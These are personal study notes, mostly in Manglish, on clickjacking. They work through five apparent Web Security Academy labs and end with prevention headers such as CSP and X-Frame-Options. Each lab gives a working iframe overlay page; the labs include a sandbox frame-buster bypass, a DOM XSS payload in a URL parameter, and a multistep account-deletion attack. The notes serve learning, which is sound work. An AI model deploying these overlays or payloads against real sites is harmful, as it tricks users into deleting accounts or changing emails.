### Clickjacking (UI redressing) :
-->oru real website inte mukalil oru fake website vechit user ethengilum button click chyumbol adiyil ulla real website il action nadakum
-->Clickjacking attacks use CSS to create and manipulate layers.The attacker incorporates the target website as an iframe layer overlaid on the decoy website
-->target website inte css il opacity zero value kodukum apol victim in adiyil ulla website kanan patila

==============================================================

       Lab-1(Basic clickjacking with CSRF token protection)
-->ivide namal login chythit nokumbol kanam delete account enna button.so athil click chyumbol direct account delete aakukayan
-->delete chyunathin mumb email oo mato onum chodikunila
-->so ingane otta click il thane important actions nadakunengil clickjack chyan patumon nokanam
-->ith mathram undayitt karyamilla.namal attack chyuna website iframe support chyumon koodi nokanam.support chyunilengil clickjacking aakila
-->so ivide support chyunund.ath mathramalla ivide burp il intercept chythit delete button click chyumbol kanam aa request il oru csrf token und. ini request drop chyuka ilegni account delete aakum
-->so csrf token unden paranjit karyamilla clickjacking nadakum
-->SCRIPT:
     <style> 
        iframe {
              position:relative; 
              width:$width_value; 
              height: $height_value; 
              opacity: $opacity; 
              z-index: 2; 
        } 
        div { 
        position:absolute; 
        top:$top_value; 
        left:$side_value; 
        z-index: 1; 
        } 
    </style> 
    <div>Test me</div> 
    <iframe src="$url"></iframe>

-->ithil url um size um oke koduth namuk test chyam.test chyumbol opacity:0.5 itt test chytho

==============================================================

### Clickbandit
-->burpt menuil poi clickbandit select chyuka.enit copy chyuka
-->ini target web ilek vanit inspect->console->paste chyuka then ctrl+enter click chyuka.apol clickjacking option mukalil kanam.
-->start click chyuka enit site ile ethengilum element click chyuka enit finish adikuka.apol namuk burp automatic aayi clickjacking word tharum ini aa wordil click chythal adiyil ulla button click aakum

        Lab-2(Clickjacking with form input data prefilled from a URL parameter)
-->ivide namuk email change chyuna sthalath aan test chyendath
-->so email change chyuka enit aa request repeater il iduk enit /POST ennath maati /GET aakuka. right click chyth change request method click chythal marikolum. enit athil /change-email/ enna path remove chyuka.enit ?email=hacker@gmai.com enn koduth send chyth nokuka.
-->aavunengil 200 OK enn kanikum.ingane chyumbol email change aavila pakaram email parameter il ee hacker@gmail.com enn varum so athan namuk vendathum
-->ini script undakam:
<style>
    iframe {
        position:relative;
        width:500px;
        height: 500px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="https://0ae900f604169aafc01a50a900b000ce.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

-->ivide src kk value kodukumbol nala pole nokanam error veran sadhyatha und correct aayi thane path kodukanam.athyath ivide /POST aayirunapol /my-account in shesham /change-email enna path undayirunu so ath remove chythitan ?email=hacke.... enn kodukendath enale request pokumbol email input il ee hacker...@gamil.com varu ok

==============================================================

          Lab-3(Clickjacking with a frame buster script)
-->ith sambavam nerthepole email change chyuna athe exploit thane aan.ivide ulla vythasam enthenal namuk veruthe clickjacking chyan patila.karanam browser frame busting technique use chyth framing prevent chyunun
-->so athinulla oru pariharaman  the HTML5 iframe `sandbox` attribute.so iframe tag il namuk ee attribute itt value aayi :allow-forms" enn koduthal mathi
-->so nerthe pole /POST request il poi change request maati /GET aaki change-email/enna path remove chyth ?email=hack.... koduth send chyumbol aakunund
-->so ini script aakam:
      <style>
    iframe {
          position:relative;
        width:500px;
        height: 500px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe sandbox="allow-forms"                             -----1) 
src="https://0a6a001d0398cd3bc0d01dcd00bb0082.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

-->ivide 1) il noku athan sandbox attribute so aa allow-forms enna value koduthal namuk frame busting prevention technique bypass chyan patum

==============================================================

        Lab-4(Exploiting clickjacking vulnerability to trigger DOM-based XSS)
-->ivide feedback enna oru page aan test chynath
-->ivide feedback il 4 input aan kodukendath name,emal,subject,message.
-->ivide name il namal enth name kodukuno ath page il thazhe aayi reflect chyunund.so aa reflect chythath namal inspect chyumbol aa name html elementil store aayi kidakunund. means domil save aayikidakunund.so ee inputil evidengilum xss kandupidikan patiyal dom xss aan
-->name field il <img src="x" onerror="alert(3)" > enn koduthit baaki ella input ilum enthengilum koduth submit chyumbol namuk xss trigger aakunund
-->ivide 4 input und so athil ellathilum fill ayale submit button namal clickjack chyan patoo
-->so oru form submit chyuka enit nerthe pole change requets method click chyth /POST method /GET aaki send chyuka apol :
      `GET /feedback/submit?csrf=4RrNvd3UwxjKaufwOq8yM7Xw9t6Bdojj&name=josu&email=josu%40josu.com&subject=josdj&message=halloo`

ennan undavuka.ingane send adichal error varum so feedback/ in sheshamulla /submit enn path remove chythit chyuka apol response 200OK enn kanam so namuk iframe il thane src il url inte last aayi ee oro parameter inum value koduth nerthepole attack chyam
-->ini script chyam :
     <style>
	iframe {
		 position:relative;
            width:500px;
            height: 500px;
            opacity: 0.5;
            z-index: 2;
    }
	div {
		 position:absolute;
                 top:420px;
                 left:80px;
                 z-index: 1;
     }
</style>
<div>click me</div>
<iframe
src="https://0ae700310356d791c5d1da390093006b.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

-->ivide src ile value nok ella input ilum namal thane url il value alredy koduth ini victim click me enna wordil click chyumbol ee domxss print function trigger chyikum

==============================================================

                  Lab-5(Multistep clickjacking)
-->ivide namal login chyuka. avide page il delete account enna option und so ath click chyumbol direct delete aakila pakaram oru confirmation message kanikum so athil yes adichale delete aaku
-->so multistep aayan ivide deletion nadakunath.so athupole namal clickjacking chyanam enale nadaku
-->so rand button adupich click chythale delete aaku so aa rand buttonum vere position il aan varunath
-->athinanusarich namal script chyanam :
      <style>
	iframe {
		 position:relative;
             width:600px;
             height: 600px;
             opacity: 0.5;
             z-index: 2;
	}
   .firstClick, .secondClick {
		  position:absolute;
          top:500px;
          left:80px;
          z-index: 1; 
	}
   .secondClick {
		top:300;
		left:200;
	}
</style>
<div class="firstClick">click me first</div>
<div class="secondClick">click me next</div>
<iframe src="https://0a7100c5036ca61dc050955f00ba00ed.web-security-academy.net/my-account"></iframe>

-->ivide namuk rand karyangal chyendath kond rand div il aayi words kodukam.enit oroninum class koduth aa class in css style kodukam.

==============================================================

### ClickJacking Prevention
-->browser side il prevent chyanayi frame bustind enn technique use chyunun.but attackers in ath bypass chyan kazhinjekum
-->server side il CSP(content security policy) polula karyangal response header aayi use chyum.It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.
-->To enable CSP, a response needs to include an HTTP response header called `Content-Security-Policy` with a value containing the policy
-->pine onnan `X-Frame-Options: deny` enna header usu chyunath.ith use chyumbol oru web page inte ullil matore frame use chyunath block chyum
-->same origin il mathram framing chyanum ith use chyum ->`X-Frame-Options: sameorigin`
-->ini vere oru website il ninum frame chyan ->`X-Frame-Options: allow-from https://normal-website.com` use chyunu.athayath ee site whitelist chythirikukayan
-->x-frame-options browser il implement chythathan 